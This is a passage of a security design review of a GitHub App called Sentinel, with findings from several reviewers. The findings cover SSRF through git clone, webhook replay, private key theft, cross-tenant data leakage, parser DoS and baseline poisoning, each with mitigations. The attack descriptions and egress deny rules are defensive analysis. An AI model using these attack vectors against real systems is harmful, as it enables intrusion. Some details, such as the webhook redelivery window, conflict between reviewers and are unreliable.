**References:** CWE-918: Server-Side Request Forgery (SSRF), OWASP: Server-Side Request Forgery, MITRE ATT&CK T1071: Application Layer Protocol - Network service scanning via SSRF, AWS: IMDSv2 for preventing SSRF to metadata service

#### [MEDIUM] Webhook Replay and Race Condition Vulnerabilities in Deduplication

The proposal mitigates webhook replay attacks via 'dedupe on X-GitHub-Delivery' but does not specify the deduplication window, storage mechanism, or race condition handling. Webhook delivery IDs are UUIDs generated by GitHub and should be unique, but the deduplication check must be atomic and persistent. If the check is in-memory only, a service restart allows replay. If the check is database-backed but not using a unique constraint or atomic operation, two concurrent deliveries of the same event (GitHub retry during network issues) could both pass deduplication and trigger duplicate scans. Additionally, the proposal does not address the five-minute redelivery window where GitHub will retry failed webhooks - if the service was down, it will receive the same event multiple times, and HMAC verification alone won't prevent duplicate processing.

**Likelihood:** Medium - GitHub webhook retry behavior is documented and expected. Without proper idempotency guarantees, retries will cause duplicate scans, wasting resources and potentially creating inconsistent findings/Check Run states. Race conditions in deduplication are common in distributed systems.

**Recommendation:** Implement robust idempotency: (1) Store delivery IDs in PostgreSQL with a unique constraint (or Redis with SETNX for faster check); (2) Use a delivery_id column in the scan_runs table or separate webhook_deliveries table; (3) Implement the idempotency check as an atomic insert-or-ignore operation before enqueueing the job; (4) Set a reasonable retention window (7 days) for delivery IDs to bound storage; (5) Design the worker to be idempotent: if a scan for (repo, head_sha, pr_number) already exists in 'running' status, skip rather than duplicate; (6) Add monitoring for duplicate delivery detection rate; (7) Handle GitHub's 'check_run' rerequested events separately from pull_request events to avoid conflation.

**References:** CWE-294: Authentication Bypass by Capture-replay, OWASP: Insufficient Anti-automation, GitHub Webhooks: Delivery headers and security, Idempotent REST API design patterns

#### [MEDIUM] Missing Comprehensive Audit Logging for Security Events and Compliance

The proposal does not specify audit logging requirements beyond 'structured logging of resource usage metrics.' For a multi-tenant service processing customer code and making authorization decisions, comprehensive audit logs are essential for security incident response, compliance (SOC 2, GDPR Article 30), and threat detection. Critical events that need auditing include: webhook signature verification failures, authorization check failures, suppression additions/modifications, policy changes, baseline updates, failed authentication attempts, database query anomalies, and findings access. Without structured audit logs exported to an immutable store (SIEM, object storage), detecting breaches, investigating incidents, and demonstrating compliance is impossible.

**Likelihood:** High likelihood of inadequate logging in initial implementation - audit logging is often an afterthought. This becomes critical during the first security incident or compliance audit.

**Recommendation:** Design comprehensive audit logging from the start: (1) Define audit event taxonomy covering authentication/authorization (installation token generation, API token usage, failed auth), data access (findings queries, graph access, baseline reads), administrative actions (suppression creation, policy updates, repo configuration changes), security events (webhook signature failures, SSRF attempts, resource limit violations); (2) Emit structured logs (JSON) with consistent schema including timestamp, event_type, actor (installation_id, user, IP), resource (repo_id, scan_id), action, outcome, context; (3) Export audit logs to immutable storage (S3 with versioning + object lock, CloudWatch Logs, dedicated SIEM) separate from application logs; (4) Implement log integrity (signed logs or write-once storage); (5) Set retention policies meeting compliance requirements (typically 1-7 years); (6) Add automated alerting on suspicious patterns (repeated auth failures, unexpected cross-tenant queries, suppression spikes); (7) Provide audit log query API for customer self-service compliance.

**References:** CWE-778: Insufficient Logging, NIST SP 800-53: AU-2 Audit Events, AU-6 Audit Review, SOC 2 Trust Service Criteria: CC7.2 Monitoring of system components, GDPR Article 30: Records of processing activities, OWASP Logging Cheat Sheet

#### [MEDIUM] Insufficient Network Segmentation and Ingress/Egress Controls

The architecture diagram shows components (webhook receiver, workers, API, database, Redis) but does not specify network segmentation boundaries or ingress/egress rules. In a secure cloud deployment, the webhook receiver should be in a public subnet (internet-facing), while workers, database, and Redis should be in private subnets with no direct internet access. The proposal mentions 'deny-list internal CIDRs at the egress proxy' for workers but does not specify whether this proxy is mandatory, how it's deployed, or whether the database and Redis are network-isolated. Without proper segmentation, a vulnerability in the webhook receiver could provide direct access to the database, or a compromised worker could exfiltrate data to attacker-controlled endpoints.

**Likelihood:** Medium - Self-hosted deployments often have flat network topologies by default. Cloud-naive operators may deploy all components in the same network segment with permissive security groups.

**Recommendation:** Provide reference architecture with network segmentation: (1) Deploy webhook receiver/API in public subnet with security group allowing only HTTPS (443) inbound from GitHub webhook IPs and authenticated API clients; (2) Deploy workers, database, and Redis in private subnets with no public IPs or internet gateway routes; (3) Use NAT gateway for worker egress limited to GitHub API/git endpoints; (4) Apply security group/firewall rules: workers can only connect to Redis (6379) and PostgreSQL (5432) on specific IPs, database accepts connections only from workers and API on private IPs; (5) Deploy egress proxy/NAT with URL filtering for worker git operations; (6) Provide Terraform/CloudFormation templates demonstrating this architecture for AWS/GCP/Azure; (7) Add network diagram showing trust boundaries and data flow; (8) Enable VPC flow logs for traffic analysis.

**References:** CWE-923: Improper Restriction of Communication Channel to Intended Endpoints, NIST SP 800-53: SC-7 Boundary Protection, CIS AWS Foundations Benchmark 5.1: Network ACL and security group controls, AWS Well-Architected Framework: Security Pillar - Network protection

#### [MEDIUM] Lack of Rate Limiting and Anti-Abuse Controls on Webhook Receiver

The webhook receiver is internet-facing and accepts POST requests from GitHub. While HMAC signature verification prevents forged events, a compromised GitHub account or misconfigured webhook could trigger excessive scan requests, exhausting worker capacity and degrading service for all installations. The proposal does not mention rate limiting on the webhook endpoint, per-installation scan quotas, or circuit breakers for installations triggering anomalous volumes. Without these controls, a single misbehaving installation (intentional abuse or misconfiguration causing webhook loops) can create a denial-of-service condition for the entire multi-tenant service.

**Likelihood:** Medium - Webhook abuse is a common problem in GitHub App services. GitHub can send duplicate events, and misconfigured workflows can create webhook loops (e.g., a workflow that comments on PRs, triggering more comment webhooks).

**Recommendation:** Implement multi-layer rate limiting: (1) Add rate limiting on the webhook endpoint (e.g., 100 requests/minute per installation using a sliding window); (2) Implement per-installation scan quotas (e.g., 50 scans/day for free tier, higher for paid, unlimited for self-hosted); (3) Add circuit breaker: auto-suspend installations after 5 consecutive scan failures or 10 scans within 1 minute; (4) Implement queue depth limits: reject new scan jobs when queue has >1000 pending jobs; (5) Add webhook event filtering: ignore events that don't require scanning (labeled, closed without merge); (6) Provide admin API to manually suspend/resume installations; (7) Add monitoring/alerting for rate limit hits and quota exhaustion; (8) Document GitHub webhook best practices to prevent loops (use `if: github.event_name != 'workflow_run'` in workflows).

**References:** CWE-770: Allocation of Resources Without Limits or Throttling, OWASP: Denial of Service, NIST SP 800-53: SC-5 Denial of Service Protection, GitHub Apps: Rate limiting and best practices

#### [LOW] Baseline Poisoning Attack Vector Through Unvalidated Automated Updates

The proposal states that 'baselines only refresh from the protected default branch after merge' but does not specify the validation process for baseline updates. If an attacker can compromise a repository's default branch (via stolen credentials, supply chain attack, or compromised CI), they can introduce dangerous code paths and simultaneously poison the baseline to accept them as 'known' rather than 'new.' Subsequent PRs would then be compared against this compromised baseline, defeating the gate. While GitHub branch protection (required reviews, status checks) mitigates this, Sentinel has no visibility into whether these protections are enabled or could be disabled after installation. The proposal mentions 'suppressions require review via CODEOWNERS on a checked-in policy file' but doesn't apply the same rigor to baseline updates.

**Likelihood:** Low - Requires compromise of repository default branch, which should be protected. However, not all repositories enable branch protection, and protections can be bypassed by repository admins.

**Recommendation:** Add baseline update validation: (1) Before accepting a baseline update, verify that the default branch has branch protection enabled (GitHub API check for required reviews, status checks); (2) Alert repository admins when baseline updates introduce high-risk paths that were previously absent (e.g., new command-exec paths); (3) Implement baseline diff reports: show the administrator what paths are being added/removed from the baseline before committing the update; (4) Provide a 'baseline approval' mode where high-risk baseline changes require manual approval via API or UI before becoming active; (5) Version baselines (keep previous N versions) with rollback capability; (6) Add audit logging of all baseline updates with before/after path counts; (7) Consider requiring that baseline updates only happen via a dedicated Sentinel bot commit that can be reviewed separately from application code changes.

**References:** CWE-345: Insufficient Verification of Data Authenticity, MITRE ATT&CK T1554: Compromise Client Software Binary, NIST SP 800-53: CM-3 Configuration Change Control, GitHub Branch Protection Documentation

**Recommendations:**

- Provide comprehensive deployment documentation including reference architectures (AWS/GCP/Azure), infrastructure-as-code templates (Terraform/CloudFormation), and security hardening checklists for self-hosted deployments. Many self-hosted operators lack cloud security expertise.
- Implement a security benchmark test suite that validates all security controls (secret injection, network isolation, resource limits, HMAC verification, rate limiting) in CI before each release. Include tests for known attack patterns (SSRF attempts, resource exhaustion, SQL injection, authorization bypass).
- Develop an incident response runbook covering likely scenarios: compromised GitHub App key, webhook secret leak, cross-tenant data exposure, resource exhaustion attack, database breach. Include steps for containment, investigation (what logs to check), communication, and recovery.
- Add a threat model document (STRIDE or similar) that systematically analyzes attack surfaces, trust boundaries, and threat actors (malicious repository owner, compromised installation, external attacker) to ensure all identified threats have mitigations.
- Create a secure defaults policy: all security controls (encryption, network segmentation, audit logging, rate limiting) should be enabled by default with explicit opt-out required, not opt-in. The proposal currently makes several critical controls optional ('per-install encryption-at-rest option', 'egress proxy').

**Open Questions:**

- What is the intended deployment model for Sentinel? Kubernetes, ECS, VM-based? This significantly impacts security recommendations (pod security policies vs. EC2 hardening).
- Will there be a managed/hosted offering, or is this strictly self-hosted? A managed offering requires additional controls (tenant isolation, SOC 2 compliance, data residency, SLA, DDoS protection).
- What are the expected scale parameters? Number of installations, repositories per installation, scans per day? This affects architecture decisions (Redis Cluster for queue, read replicas for database, worker auto-scaling policies).
- What is the backup and disaster recovery strategy for the PostgreSQL findings database? RPO/RTO requirements? Should this be documented as part of the deployment guide?
- How should operators handle GitHub App key rotation in production without downtime? Is there a grace period where both old and new keys are accepted?
- Are there specific compliance frameworks this needs to support (SOC 2, ISO 27001, FedRAMP)? This would dictate additional controls (FIPS 140-2 cryptography, specific audit log retention, access control matrices).
- What is the update/patching strategy for Sentinel in self-hosted environments? Automated updates could introduce vulnerabilities, but manual updates may lag leaving systems exposed.
- Should the service implement any allowlist/denylist for installation (e.g., only allow installations in specific GitHub organizations, or require manual approval for new installations)?

### IAM Engineer

The Sentinel GitHub App introduces several identity and access management risks that require hardening before production deployment. Most critical: the API has no authentication model specified, creating an open data exposure risk. The GitHub App credential lifecycle is well-designed with short-lived installation tokens and HMAC webhook verification, but key rotation procedures are incomplete. Multi-tenant authorization relies on query scoping without enforcement guarantees. The suppression approval workflow lacks IAM integration, allowing any API caller to create permanent waivers. Worker isolation and least-privilege container design are mentioned but not sufficiently detailed.

**Confidence:** high

#### [CRITICAL] Sentinel REST API lacks authentication and authorization model

The specification describes a REST API (`sentinel/api.py`) exposing scans, findings, suppressions, and policy management but does not define any authentication mechanism. Without authentication, any network-reachable client could read all findings (including source graph data from all tenants), create suppressions to whitelist dangerous paths, or modify repo policies. The multi-tenant isolation mentioned in mitigations ("every query scoped by installation_id / repo_id") cannot be enforced without authenticated context proving the caller's installation/repo association.

**Likelihood:** High — the API is explicitly designed for external consumption ("REST for scans/findings/suppressions/policy"), so it will be network-exposed. Without authentication, discovery is trivial.

**Recommendation:** Implement OAuth 2.0 with GitHub as the IdP. Require API clients to authenticate via GitHub OAuth tokens that prove installation admin membership. Validate the token's installation_id against the requested resource's installation_id for every query. Alternatively, issue signed API keys scoped to a single installation, stored hashed in the database. Never allow unauthenticated access to findings or policy.

**References:** OWASP API Security Top 10 - API1:2023 Broken Object Level Authorization, CWE-306: Missing Authentication for Critical Function, NIST SP 800-63B: Digital Identity Guidelines (Authentication), MITRE ATT&CK T1078: Valid Accounts

#### [HIGH] Suppression creation bypasses approval workflow and lacks ABAC controls

The `Suppression` table allows any API caller to create a permanent waiver (or time-boxed with `expires_at`) that exempts a dangerous path from gating, bypassing the intended review process. The specification mentions "suppressions require review via CODEOWNERS on a checked-in policy file" in risk mitigations, but the data model and API contradict this — suppressions are database records created via the REST API, not code-reviewed files. The `created_by` field is a free-form string with no proof of identity. An attacker who gains API access (see previous finding) or a compromised/malicious repo admin could suppress all findings, permanently disabling the gate.

**Likelihood:** Medium — requires API access (critical if unauthenticated) or compromise of a repo admin. Insider threat is plausible in multi-tenant scenarios.

**Recommendation:** Move suppressions to a `.entrygraph/suppressions.yml` file in the repository, protected by CODEOWNERS requiring security team review. The API should only *propose* suppressions (creating a draft PR); human approval merges them. If database suppressions are kept for operational speed, require two-person integrity: creation requires an authenticated request from a repo admin, and activation requires a second approval from a security-team role, tracked in an audit log. Enforce that `created_by` is the authenticated GitHub username, not a caller-controlled string.

**References:** CWE-269: Improper Privilege Management, MITRE ATT&CK T1562.001: Impair Defenses - Disable or Modify Tools, NIST AC-3: Access Enforcement (separation of duties), SOC 2 CC6.3: Logical access controls include separation of duties

#### [HIGH] GitHub App private key rotation runbook not defined

The specification lists "key rotation runbook" in mitigations but does not define its contents. The GitHub App private key is a single high-value secret that, if compromised, grants the attacker the ability to generate valid JWTs for the app and exchange them for installation tokens across all tenants. Without a tested rotation procedure (revoke old key in GitHub, deploy new key to all Sentinel instances, verify no downtime or stuck workers using cached keys), a suspected compromise becomes a multi-hour incident with undefined blast radius. The risk section notes "full impersonation of the app across all installs" but does not describe detection (audit logging of JWT generation) or containment.

**Recommendation:** Document a tested key rotation procedure: (1) GitHub App settings support multiple concurrent private keys; deploy the new key to Sentinel config without removing the old. (2) Restart/drain all workers so they pick up the new key. (3) Monitor that no JWTs are signed with the old key for 24 hours. (4) Revoke the old key in GitHub settings. Store key version metadata alongside each installation token issuance so forensic investigation can determine if a compromised key was used. Automate rotation quarterly. Implement audit logging of all JWT generations with key fingerprint and installation_id.

**References:** CWE-320: Key Management Errors, NIST SP 800-57: Recommendation for Key Management, MITRE ATT&CK T1552.004: Unsecured Credentials - Private Keys, NIST IR 8011: Credential Management

#### [MEDIUM] Installation tokens not explicitly scoped to minimum necessary permissions

The specification states "scope tokens to the minimum permissions (contents:read, checks:write, pull_requests:read)" in risk mitigations but does not mandate this in the implementation section. The GitHub App manifest (not included in the spec) defines the requested permissions, and developers may over-provision (e.g., `contents:write` for convenience). Over-scoped tokens increase blast radius: a compromised installation token could modify repository content or settings beyond what the reachability gate requires. The spec also does not address whether the app requests organization-level or user-level installation, which changes the permission surface.

**Recommendation:** Explicitly document the GitHub App manifest with minimum permissions: `contents: read` (fetch code), `checks: write` (post Check Runs), `security_events: write` (upload SARIF), `pull_requests: read` (metadata for Check Run context). Reject `contents: write`, `administration`, or `organization` scopes. Enforce repo-level installation only (not organization-wide) so each repository opt-in is explicit. In CI/CD, validate that the deployed app manifest matches the documented minimal set before release.

**References:** CWE-250: Execution with Unnecessary Privileges, NIST AC-6: Least Privilege, GitHub Apps Best Practices: Request the minimum permissions, MITRE ATT&CK T1098: Account Manipulation

#### [MEDIUM] Worker container isolation relies on unspecified runtime security controls

The risk mitigation for analyzing untrusted code specifies "run the worker in a locked-down container (read-only FS, no network egress except the git fetch)" but does not define how these controls are enforced. Without a concrete seccomp/AppArmor profile, capability drop list, and network policy, the "locked-down" description is aspirational. The worker must execute git (either via dulwich or shelled-out `git`), which is a large attack surface. If the container runs as root or with excessive capabilities (CAP_SYS_ADMIN, etc.), a malicious repository could exploit a tree-sitter or dulwich vulnerability to escape the container or exfiltrate secrets from the environment.

**Recommendation:** Define a strict container security policy: run as a non-root UID (>10000), drop all capabilities, mount filesystem read-only except a small `/tmp` with noexec/nosuid, enable a seccomp profile that denies mount/chroot/setuid, and enforce a network policy that only allows egress to GitHub's IP ranges on port 443 (DNS + HTTPS). If using shelled-out `git`, pass `--depth=1` and `--single-branch`, and consider using a distroless or Alpine-based image with no shell. Test the isolation by attempting privilege escalation from within a worker container; verify it fails.

**References:** CWE-250: Execution with Unnecessary Privileges, CWE-269: Improper Privilege Management, NIST SP 800-190: Application Container Security Guide, CIS Docker Benchmark 5.12: Run containers with minimal privileges, MITRE ATT&CK T1611: Escape to Host

#### [MEDIUM] Multi-tenant row-level authorization not enforced at database layer

The specification states "every query scoped by installation_id / repo_id" to prevent cross-tenant data leakage but does not describe how this scoping is enforced. If the application code constructs queries by joining `installation_id` conditions, a logic bug (missing WHERE clause, SQL injection, ORM misuse) could bypass the check. PostgreSQL supports row-level security (RLS) policies that enforce tenant isolation at the database layer regardless of application bugs, but the data model does not mention RLS or any database-enforced access control. The risk is amplified because findings contain "source graph data," which is sensitive IP that would be catastrophic to leak.

**Recommendation:** Implement PostgreSQL row-level security policies on all multi-tenant tables (`repositories`, `baselines`, `scan_runs`, `findings`, `suppressions`). Create a policy that restricts SELECT/UPDATE/DELETE to rows where the table's `installation_id` (or `repo_id` via FK) matches `current_setting('app.installation_id')`. The application sets this session variable after authenticating the API request or worker job. RLS acts as defense-in-depth: even if a query omits the WHERE clause, the database blocks cross-tenant reads. Test with a dedicated audit: attempt to query another installation's findings and verify the DB returns zero rows, not a permission error.

**References:** CWE-566: Authorization Bypass Through User-Controlled SQL Primary Key, OWASP API Security A1:2023 Broken Object Level Authorization, PostgreSQL Row Security Policies documentation, NIST AC-3: Access Enforcement, CIS PostgreSQL Benchmark 6.2: Enable row-level security

#### [MEDIUM] Baseline poisoning protection assumes merge controls without verification

The risk mitigation for baseline poisoning states "baselines only refresh from the protected default branch after merge" but does not specify how Sentinel verifies that the commit is from the protected branch or that branch protection is enabled. A malicious user with repo write (but not admin) could push directly to `main` if branch protection is misconfigured or disabled, or force-push a poisoned baseline. If Sentinel trusts any commit on the default branch name without verifying GitHub's branch protection status, it will accept a malicious baseline. Once poisoned, all subsequent PRs compare against a baseline that includes the dangerous path, so it is never flagged.

**Recommendation:** Before updating a baseline, use the GitHub API to verify that the commit is (1) on the repository's default branch, (2) that branch has protection enabled requiring pull request reviews, and (3) the commit has at least one approving review. Refuse to update the baseline if these checks fail. Expose baseline update events in an audit log with the commit SHA, author, and protection status for forensic review. Consider a "baseline review" workflow where the security team explicitly approves baseline refreshes after major releases rather than automatic on-merge.

**References:** CWE-345: Insufficient Verification of Data Authenticity, MITRE ATT&CK T1565.001: Data Manipulation - Stored Data Manipulation, GitHub Branch Protection documentation, NIST CM-3: Configuration Change Control

#### [LOW] Delivery ID deduplication window and storage not specified

The webhook receiver deduplicates on `X-GitHub-Delivery` to prevent replay attacks, but the specification does not define how long delivery IDs are retained or where they are stored. If stored in memory (Redis cache), a worker restart or Redis eviction could allow a replayed webhook. If stored in the database without a TTL or index, the deduplication table grows unbounded. GitHub does not guarantee globally unique delivery IDs across all time, so an attacker could replay a very old webhook ID after it ages out of the deduplication store.

**Recommendation:** Store delivery IDs in Redis with a 24-hour TTL (GitHub's webhook redelivery window). Use a sorted set keyed by delivery ID with the timestamp as score; expire entries older than 24 hours. On startup, if Redis is empty, reject all webhooks for 60 seconds while warming the set from recent database ScanRun records (allowing workers to restart without a replay window). Alternatively, store delivery IDs in the database with a UNIQUE constraint and an indexed timestamp column, and run a daily cleanup job deleting entries older than 7 days.

**References:** CWE-294: Authentication Bypass by Capture-replay, OWASP ASVS 9.2.3: Replay resistance, GitHub Webhook Best Practices

**Recommendations:**

- Implement a threat model workshop focused on Sentinel's API and multi-tenant boundaries before the MVP milestone. Invite security, engineering, and a representative GitHub customer admin to walk through attack scenarios (compromised installation token, malicious repo admin, insider threat, supply chain compromise of a dependency). Document findings in a public threat model document.
- Add an "authentication & authorization" milestone before Sentinel MVP that defines the API auth model, implements it with tests, and includes an external security review of the authn/authz code paths.
- Extend the acceptance criteria to include: "An unauthenticated request to the findings API returns HTTP 401. A user authenticated to installation A cannot read findings from installation B (returns HTTP 403). A suppression created via the API requires a second approval before it exempts a finding. The worker rejects a webhook with a valid HMAC but replayed X-GitHub-Delivery ID."
- Add observability for IAM events: audit log (append-only table or SIEM export) capturing all API authentication attempts, installation token issuances, suppression creations/approvals, baseline updates, and app uninstalls with the actor's GitHub identity. Export to a SIEM or queryable log store for incident response.

**Open Questions:**

- Who is the intended API user — org admins, security teams, CI systems? The auth model depends on this: if CI systems need read-only access to findings, they need service-account tokens or GitHub Actions OIDC integration.
- Should the API support organization-level vs. repository-level access? E.g., can an org admin view findings across all repos in their org, or is access repo-scoped only?
- What is the session/token lifetime for API clients? Short-lived (1 hour) reduces compromise window but increases token refresh complexity.
- How are revoked GitHub users or removed org members handled? Is there a periodic sync to revoke access when someone leaves the org?
- Does the self-hosted deployment model assume single-tenant (one org runs Sentinel for themselves) or multi-tenant (a platform team runs Sentinel for multiple orgs)? The IAM design differs significantly.
- Is there any plan for federated access (SAML/OIDC from corporate IdP) for the API, or is GitHub OAuth the only supported IdP?
- What audit/compliance requirements (SOC 2, ISO 27001, GDPR) apply to Sentinel? These drive specific IAM controls (MFA enforcement, access reviews, data residency).

### Penetration Test Engineer

This system presents a high-value attack surface: a GitHub App with repository access that analyzes untrusted PR code and controls merge decisions. Primary risks center on webhook authentication bypass (forged events triggering unauthorized scans or poisoning results), resource exhaustion via malicious parse targets, and multi-tenant authorization failures leaking cross-organization data. The stored credentials (App private key, webhook secret) are single points of compromise granting broad impersonation. While 'no code execution' reduces one major risk class, the parsing/graph-building pipeline remains vulnerable to algorithmic complexity attacks, and the git fetch mechanism introduces SSRF potential if not tightly constrained. Baseline poisoning—accepting a dangerous path before the gate activates—could create a persistent blind spot. Suppression and policy management without strict authorization allow attackers to disable their own detections.

**Confidence:** high

#### [CRITICAL] Webhook HMAC verification bypass or secret compromise enables full app impersonation

The webhook receiver verifies X-Hub-Signature-256 HMAC using a shared secret. If this secret leaks (environment variable exposure, logs, insecure storage, or network interception), an attacker can forge arbitrary webhooks. This allows triggering scans on repos outside their control, injecting fake scan results to manipulate Check Runs (making malicious PRs appear clean or DoSing legitimate PRs with false failures), resource exhaustion via scan spam, and potentially pivoting to other installations if the secret is global. Even with proper verification, implementation flaws (timing attacks, signature validation bugs, replay window) could allow bypass.

**Likelihood:** High if secret handling is weak (common misconfiguration: logging full requests, secrets in container env visible in orchestrator UIs, no rotation). The design doc states 'verify X-Hub-Signature-256 HMAC' and 'dedupe on X-GitHub-Delivery' but does not specify replay window bounds, constant-time comparison, or how the secret is provisioned. Given the webhook is public-facing and handles untrusted input, this is a prime target.

**Recommendation:** 1) Store webhook secret in a dedicated secret manager (AWS Secrets Manager, Vault) with strict IAM; fetch at runtime, never log. 2) Use constant-time HMAC comparison (hmac.compare_digest). 3) Enforce a replay window: reject events older than 5 minutes based on event timestamp vs. server time. 4) Scope secrets per-installation if possible; rotate on any suspected compromise. 5) Rate-limit webhook endpoint by source IP and per-installation. 6) Monitor for anomalous scan patterns (scans of repos not in the installation's repo set, excessive scans from one source).

**References:** CWE-345: Insufficient Verification of Data Authenticity, CWE-208: Observable Timing Discrepancy, OWASP API Security Top 10 - API2:2023 Broken Authentication, GitHub Webhooks Best Practices: https://docs.github.com/en/webhooks/using-webhooks/validating-webhook-deliveries

#### [CRITICAL] GitHub App private key theft grants persistent cross-installation access

The App private key is used to generate JWTs, which are then exchanged for installation tokens. If an attacker obtains this key (from environment variables visible in container metadata APIs, logs, memory dumps, or a compromised secret store), they can impersonate the app for all installations indefinitely. This enables: reading any repo the app is installed on (contents:read), writing Check Runs to pass malicious PRs (checks:write), and accessing PR metadata. The damage persists until the key is rotated, and rotation is complex (requires updating GitHub App settings and redeploying all Sentinel instances).

**Likelihood:** Medium. The design doc acknowledges this risk ('Secrets from env/secret manager only, never in the DB or logs; short-lived installation tokens; key rotation runbook') but does not detail how the key is injected (env var, volume mount, sidecar) or protected at rest. Environment variables are a common vector: visible in orchestrator UIs, process listings, and easily leaked via error reporting. Memory dumps from a compromised worker could extract the key if it's held plaintext.

**Recommendation:** 1) Store private key in a dedicated secret manager with audit logging; retrieve via short-lived, workload-identity-bound credentials (e.g., AWS IAM role for ECS task). 2) Never log the key; redact it in error messages. 3) Minimize in-memory lifetime: load only when signing JWTs, zero the buffer afterward. 4) Implement key rotation: maintain old + new key simultaneously during transition, update GitHub App config, roll Sentinel deployments, then retire old key. Automate rotation quarterly. 5) Monitor JWT issuance: alert on unexpected installation IDs, rate spikes, or off-hours generation. 6) Scope installation tokens to minimum permissions and shortest TTL (1 hour).

**References:** CWE-522: Insufficiently Protected Credentials, CWE-321: Use of Hard-coded Cryptographic Key, MITRE ATT&CK T1552.001: Unsecured Credentials in Files, GitHub App Security: https://docs.github.com/en/apps/creating-github-apps/authenticating-with-a-github-app/managing-private-keys-for-github-apps

#### [HIGH] Malicious PR content triggers resource exhaustion via parsing complexity attacks

While entrygraph never executes PR code, it must parse it with tree-sitter and build a graph. An attacker can craft inputs that exploit algorithmic complexity: deeply nested structures (e.g., 10,000-level nested function calls or list comprehensions), extremely long identifiers, or pathological patterns that cause tree-sitter or the graph builder to consume excessive CPU/memory. The design doc mentions 'per-file size caps, total time budget, max-nodes limits' but provides no specifics. Without hard enforcement, a single malicious PR can DoS the scan worker, blocking all legitimate scans and degrading the CI pipeline. This is especially damaging because the worker must fetch and analyze every PR synchronize event.

**Likelihood:** High. Complexity attacks against parsers are well-documented (e.g., ReDoS in regex parsers, billion laughs in XML). Tree-sitter is generally efficient but not immune to crafted edge cases. The async worker model means one slow job can starve others if worker pool size is small. An attacker can iterate locally to find inputs that maximize parse time, then submit PRs repeatedly.

**Recommendation:** 1) Enforce strict limits: max file size 1MB, max parse time 30s per file, max 1000 files, total scan timeout 5 minutes. Kill scans exceeding these. 2) Run workers in cgroups with CPU/memory caps (e.g., 1 CPU, 512MB RAM). 3) Implement a separate fast-path pre-check: count files, total byte size, reject obviously abusive PRs before parse. 4) Use a priority queue: throttle scans from repos with repeated failures. 5) Monitor parse time metrics; alert on anomalies. 6) Test with fuzzer-generated parse targets (e.g., tree-sitter-fuzz) to identify worst-case inputs. 7) Consider sandboxing with seccomp/AppArmor to restrict syscalls even though no code executes.

**References:** CWE-407: Inefficient Algorithmic Complexity, CWE-770: Allocation of Resources Without Limits, OWASP DoS Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/Denial_of_Service_Cheat_Sheet.html, MITRE ATT&CK T1499: Endpoint Denial of Service

#### [HIGH] Multi-tenant SQL injection or authorization bypass leaks cross-organization findings

Sentinel is a multi-tenant system: one Postgres database holds findings for multiple GitHub organizations/installations. Every query must filter by installation_id or repo_id to ensure isolation. If these filters are missing, improperly parameterized (SQL injection), or bypassable via JWT token confusion (e.g., manipulated installation ID in a token claim without server-side validation), an attacker can read findings from repos they don't control. This leaks sensitive information: code structure, vulnerable paths, internal API names. The design doc states 'Every query scoped by installation_id / repo_id; row-level authorization checks' but does not detail the authorization mechanism or how installation_id is securely bound to the session.

**Likelihood:** Medium. SQLAlchemy 2.0 ORM provides parameterization by default, reducing raw SQL injection risk, but authorization logic is application-layer. A missing .filter(repo_id=...) in one endpoint, or a confused deputy scenario where the installation_id from the webhook is trusted without cross-checking against the JWT's installation scope, could leak data. Multi-tenant bugs are common (see Codecov, CircleCI incidents).

**Recommendation:** 1) Implement a mandatory filter decorator or ORM session-level filter that automatically applies installation_id to every query; fail loudly if bypassed. 2) Never trust client-supplied installation_id or repo_id; derive from the GitHub App installation token's scope after JWT verification. 3) Use parameterized queries exclusively; ban raw SQL. 4) Add integration tests for every API endpoint: request data for repo A while authenticated as installation B, assert 403/404. 5) Audit all queries that join across installations (e.g., aggregations) for leakage. 6) Implement database-level row-level security (Postgres RLS) as defense-in-depth. 7) Log every cross-tenant query attempt for anomaly detection.

**References:** CWE-89: SQL Injection, CWE-639: Authorization Bypass Through User-Controlled Key, OWASP Top 10 - A01:2021 Broken Access Control, OWASP API Security - API1:2023 Broken Object Level Authorization, NIST SP 800-53 AC-3: Access Enforcement

#### [HIGH] SSRF via git clone of attacker-controlled URLs fetches internal resources

The worker fetches PR head and base commits via git. The design doc states 'Only fetch repos the installation grants, using the installation token and GitHub's clone URL — never a user-supplied URL; deny-list internal CIDRs at the egress proxy.' However, there are several attack vectors: 1) If dulwich or subprocess git is passed a URL derived from webhook data without strict validation, an attacker could inject a git:// or file:// URL. 2) GitHub's redirect behavior: a malicious org could rename a repo or use GitHub Pages to redirect the clone URL to an internal service. 3) DNS rebinding: resolve to GitHub initially, then switch to an internal IP mid-clone. 4) If the installation token is used but the repo URL is user-controlled (e.g., from a fork), the attacker controls the server.

**Likelihood:** Medium. The use of an installation token and explicit GitHub clone URL reduces risk, but implementation bugs (e.g., string interpolation instead of library URL parsing, trusting webhook repo.clone_url without validation, no timeout on DNS resolution) could enable bypass. The deny-list approach ('deny-list internal CIDRs at the egress proxy') is prone to gaps (IPv6, localhost, cloud metadata endpoints like 169.254.169.254).

**Recommendation:** 1) Construct clone URLs exclusively from validated installation + repo ID, never from webhook payload strings: https://x-access-token:<token>@github.com/<validated_owner>/<validated_repo>.git. 2) Validate owner and repo against the installation's authorized repository set before clone. 3) Use an allow-list egress proxy: only github.com and GitHub Enterprise domains, block all RFC1918, loopback, link-local, cloud metadata ranges. 4) Set aggressive clone timeouts (30s). 5) Perform DNS resolution explicitly and validate the IP is in GitHub's published ranges before connect. 6) Run git in a separate network namespace with no access to the host network or internal services. 7) If using dulwich, audit for SSRF issues; if shelling out to git, use a hardened wrapper that rejects non-HTTPS schemes.

**References:** CWE-918: Server-Side Request Forgery (SSRF), OWASP SSRF Prevention Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html, MITRE ATT&CK T1071.001: Application Layer Protocol - Web Protocols, HackerOne SSRF in git: https://hackerone.com/reports/115748

#### [HIGH] Baseline poisoning allows persistent backdoor via race condition or pre-gate merge

Baselines define the 'known good' set of reachable paths; only new paths trigger the gate. An attacker can poison the baseline by: 1) Merging a PR that introduces a dangerous path before the gate is enabled ('first N days' warn mode). 2) Exploiting a race condition: if baseline refresh on merge to main is async, a quick second PR might compare against a stale baseline. 3) Social engineering: convincing a maintainer to suppress a finding, then relying on automatic baseline acceptance. Once a path is in the baseline, future PRs with the same vulnerability pass silently. The design doc states 'Baselines only refresh from the protected default branch after merge' but does not detail the atomicity of this operation or validation of the merged commit's safety.

